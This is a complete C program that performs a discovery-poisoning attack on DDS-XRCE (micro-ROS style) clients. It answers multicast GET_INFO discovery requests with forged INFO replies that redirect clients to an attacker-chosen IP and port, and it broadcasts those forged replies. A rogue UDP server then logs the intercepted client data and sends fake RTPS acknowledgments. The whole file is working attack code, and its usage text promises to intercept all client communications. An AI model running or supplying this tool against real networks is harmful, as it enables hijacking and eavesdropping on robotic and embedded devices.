// Compile: gcc attack_discovery_poison.c -o discovery_poison -lpthread
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>

#define DISCOVERY_PORT 7400
#define DISCOVERY_MULTICAST_IP "239.255.0.2"
#define DEFAULT_ROGUE_AGENT_PORT 6666
#define BUFFER_SIZE 1024
#define MAX_THREADS 2

// Thread argument structure
typedef struct
{
    char malicious_ip[16];
    uint16_t rogue_agent_port;
} thread_args_t;

// Global flag for graceful shutdown
volatile int running = 1;

void *rogue_agent_server(void *arg)
{
    thread_args_t *args = (thread_args_t *)arg;

    printf("[*] Starting rogue agent server on port %u...\n", args->rogue_agent_port);

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0)
    {
        perror("[-] Socket creation failed");
        return NULL;
    }

    // Set socket options
    int reuse = 1;
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse)) < 0)
    {
        perror("[-] Setsockopt SO_REUSEADDR failed");
    }

    // Set receive timeout
    struct timeval tv;
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    struct sockaddr_in bind_addr;
    memset(&bind_addr, 0, sizeof(bind_addr));
    bind_addr.sin_family = AF_INET;
    bind_addr.sin_addr.s_addr = INADDR_ANY;
    bind_addr.sin_port = htons(args->rogue_agent_port);

    if (bind(sock, (struct sockaddr *)&bind_addr, sizeof(bind_addr)) < 0)
    {
        perror("[-] Bind failed");
        close(sock);
        return NULL;
    }

    printf("[+] Rogue agent listening on port %u\n", args->rogue_agent_port);

    uint8_t buffer[BUFFER_SIZE];
    struct sockaddr_in client_addr;
    socklen_t addr_len = sizeof(client_addr);

    while (running)
    {
        int recv_len = recvfrom(sock, buffer, BUFFER_SIZE, 0,
                                (struct sockaddr *)&client_addr, &addr_len);

        if (recv_len > 0)
        {
            char client_ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &client_addr.sin_addr, client_ip, sizeof(client_ip));

            printf("[+] Intercepted %d bytes from %s:%d\n",
                   recv_len, client_ip, ntohs(client_addr.sin_port));

            // Log first 64 bytes in hex
            printf("[DATA] ");
            int print_len = recv_len < 64 ? recv_len : 64;
            for (int i = 0; i < print_len; i++)
            {
                printf("%02X ", buffer[i]);
                if ((i + 1) % 16 == 0)
                    printf("\n       ");
            }
            printf("\n");

            // Send fake RTPS acknowledgment
            uint8_t ack[12];
            memcpy(ack, "RTPS", 4);
            ack[4] = 2;    // version major
            ack[5] = 3;    // version minor
            ack[6] = 0x01; // vendor id
            ack[7] = 0x0F;
            memset(ack + 8, 0, 4);

            sendto(sock, ack, sizeof(ack), 0,
                   (struct sockaddr *)&client_addr, addr_len);

            printf("[+] Sent fake ACK to %s\n", client_ip);
        }
        else if (recv_len < 0 && errno != EAGAIN && errno != EWOULDBLOCK)
        {
            perror("[-] Recvfrom error");
        }
    }

    close(sock);
    printf("[*] Rogue agent server stopped\n");
    return NULL;
}

void *discovery_responder(void *arg)
{
    thread_args_t *args = (thread_args_t *)arg;

    printf("[*] Starting discovery responder on port %d...\n", DISCOVERY_PORT);

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0)
    {
        perror("[-] Socket creation failed");
        return NULL;
    }

    // Set socket options
    int reuse = 1;
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse)) < 0)
    {
        perror("[-] Setsockopt SO_REUSEADDR failed");
    }

    // Set broadcast option for sending
    int broadcast = 1;
    if (setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast)) < 0)
    {
        perror("[-] Setsockopt SO_BROADCAST failed");
    }

    // Set receive timeout
    struct timeval tv;
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    struct sockaddr_in bind_addr;
    memset(&bind_addr, 0, sizeof(bind_addr));
    bind_addr.sin_family = AF_INET;
    bind_addr.sin_addr.s_addr = INADDR_ANY;
    bind_addr.sin_port = htons(DISCOVERY_PORT);

    if (bind(sock, (struct sockaddr *)&bind_addr, sizeof(bind_addr)) < 0)
    {
        perror("[-] Bind failed");
        close(sock);
        return NULL;
    }

    // XRCE clients send GET_INFO to this group (uxr_discovery_agents_default)
    struct ip_mreq mreq;
    mreq.imr_multiaddr.s_addr = inet_addr(DISCOVERY_MULTICAST_IP);
    mreq.imr_interface.s_addr = htonl(INADDR_ANY);
    if (setsockopt(sock, IPPROTO_IP, IP_ADD_MEMBERSHIP, &mreq, sizeof(mreq)) < 0)
    {
        perror("[-] Setsockopt IP_ADD_MEMBERSHIP failed");
    }

    printf("[+] Discovery responder listening on port %d (group %s)\n", DISCOVERY_PORT, DISCOVERY_MULTICAST_IP);

    uint8_t buffer[BUFFER_SIZE];
    struct sockaddr_in client_addr;
    socklen_t addr_len = sizeof(client_addr);

    while (running)
    {
        int recv_len = recvfrom(sock, buffer, BUFFER_SIZE, 0,
                                (struct sockaddr *)&client_addr, &addr_len);

        if (recv_len > 0)
        {
            char client_ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &client_addr.sin_addr, client_ip, sizeof(client_ip));

            // Answer only XRCE GET_INFO (header without client key, submessage 0x02).
            // Our own INFO replies come back here (unicast to self, broadcast loopback) and must not be answered.
            if (recv_len < 12 || buffer[0] < 0x80 || buffer[4] != 0x02)
            {
                printf("[*] Ignored non-GET_INFO datagram from %s:%d (%d bytes)\n",
                       client_ip, ntohs(client_addr.sin_port), recv_len);
                continue;
            }

            printf("[*] Discovery request from %s:%d (%d bytes)\n",
                   client_ip, ntohs(client_addr.sin_port), recv_len);

            // Convert malicious IP to network format
            struct in_addr mal_addr;
            if (inet_pton(AF_INET, args->malicious_ip, &mal_addr) != 1)
            {
                printf("[-] Invalid malicious IP format\n");
                continue;
            }

            // Craft malicious XRCE INFO (Agent layout, little endian, CDR alignment from message start)
            uint8_t response[44];
            memset(response, 0, sizeof(response));
            memcpy(response, buffer, 4);         // message header copied from the request
            response[4] = 0x06;                  // submessage INFO
            response[5] = 0x01;                  // flags: little endian
            response[6] = sizeof(response) - 8;  // submessage length
            memcpy(response + 8, buffer + 8, 4); // related request: request_id, object_id
            response[14] = 1;                    // optional_config (status OK at 12-13)
            response[15] = 0x0D;                 // OBJK_AGENT
            memcpy(response + 16, "XRCE", 4);    // xrce_cookie
            response[20] = 0x01;                 // xrce_version 1.0
            response[22] = 0x01;                 // xrce_vendor_id (eProsima)
            response[23] = 0x0F;
            response[25] = 1;                    // optional_activity (no properties at 24)
            response[26] = 0x0D;                 // OBJK_AGENT
            response[28] = 1;                    // availability
            response[32] = 1;                    // address_seq size
            response[36] = 1;                    // ADDRESS_FORMAT_MEDIUM
            memcpy(response + 37, &mal_addr, 4);
            response[42] = (uint8_t)(args->rogue_agent_port & 0xFF);
            response[43] = (uint8_t)(args->rogue_agent_port >> 8);
            int offset = sizeof(response);

            // Send malicious response back to requester
            int sent = sendto(sock, response, offset, 0,
                              (struct sockaddr *)&client_addr, addr_len);

            if (sent > 0)
            {
                printf("[+] Sent poisoned response (%d bytes) redirecting to %s:%u\n",
                       sent, args->malicious_ip, args->rogue_agent_port);
            }
            else
            {
                perror("[-] Failed to send response");
            }

            // Also broadcast to local network
            struct sockaddr_in broadcast_addr;
            memset(&broadcast_addr, 0, sizeof(broadcast_addr));
            broadcast_addr.sin_family = AF_INET;
            broadcast_addr.sin_addr.s_addr = htonl(INADDR_BROADCAST);
            broadcast_addr.sin_port = htons(DISCOVERY_PORT);

            sendto(sock, response, offset, 0,
                   (struct sockaddr *)&broadcast_addr, sizeof(broadcast_addr));
        }
        else if (recv_len < 0 && errno != EAGAIN && errno != EWOULDBLOCK)
        {
            perror("[-] Recvfrom error");
        }
    }

    close(sock);
    printf("[*] Discovery responder stopped\n");
    return NULL;
}

void signal_handler(int signum)
{
    (void)signum;
    printf("\n[*] Shutting down gracefully...\n");
    running = 0;
}

int main(int argc, char **argv)
{
    if (argc < 2 || argc > 3)
    {
        printf("Usage: %s <malicious_agent_ip> [rogue_agent_port]\n", argv[0]);
        printf("Example: %s 192.168.1.100 %d\n", argv[0], DEFAULT_ROGUE_AGENT_PORT);
        printf("\nThis will:\n");
        printf("1. Respond to discovery requests on port %d\n", DISCOVERY_PORT);
        printf("2. Redirect clients to rogue agent at <ip>:<rogue_agent_port>\n");
        printf("3. Intercept all client communications\n");
        printf("\nNote: May require root privileges to bind to port %d\n", DISCOVERY_PORT);
        return 1;
    }

    // Check if running as root
    if (geteuid() != 0)
    {
        printf("[WARNING] Not running as root. May fail to bind to port %d\n", DISCOVERY_PORT);
        printf("          Run with: sudo %s %s\n", argv[0], argv[1]);
    }

    thread_args_t args;
    strncpy(args.malicious_ip, argv[1], sizeof(args.malicious_ip) - 1);
    args.malicious_ip[sizeof(args.malicious_ip) - 1] = '\0';
    args.rogue_agent_port = DEFAULT_ROGUE_AGENT_PORT;

    if (argc == 3)
    {
        char *endptr = NULL;
        long parsed_port = strtol(argv[2], &endptr, 10);
        if (*argv[2] == '\0' || *endptr != '\0' || parsed_port < 1 || parsed_port > 65535)
        {
            printf("[-] Invalid rogue agent port: %s\n", argv[2]);
            return 1;
        }
        args.rogue_agent_port = (uint16_t)parsed_port;
    }

    // Validate IP address
    struct in_addr test_addr;
    if (inet_pton(AF_INET, args.malicious_ip, &test_addr) != 1)
    {
        printf("[-] Invalid IP address: %s\n", args.malicious_ip);
        return 1;
    }

    printf("=== Agent Discovery Poisoning Attack ===\n");
    printf("Rogue agent IP: %s\n", args.malicious_ip);
    printf("Rogue agent port: %u\n", args.rogue_agent_port);
    printf("Discovery port: %d\n\n", DISCOVERY_PORT);

    // Set up signal handler for graceful shutdown
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    pthread_t responder_thread, server_thread;

    // Start discovery responder
    if (pthread_create(&responder_thread, NULL, discovery_responder, &args) != 0)
    {
        perror("[-] Failed to create responder thread");
        return 1;
    }

    sleep(1);

    // Start rogue agent server
    if (pthread_create(&server_thread, NULL, rogue_agent_server, &args) != 0)
    {
        perror("[-] Failed to create server thread");
        running = 0;
        pthread_join(responder_thread, NULL);
        return 1;
    }

    printf("\n[*] Rogue infrastructure running...\n");
    printf("[*] Press Ctrl+C to stop\n\n");

    // Wait for threads to complete
    pthread_join(responder_thread, NULL);
    pthread_join(server_thread, NULL);

    printf("\n[*] Attack stopped\n");
    return 0;
}
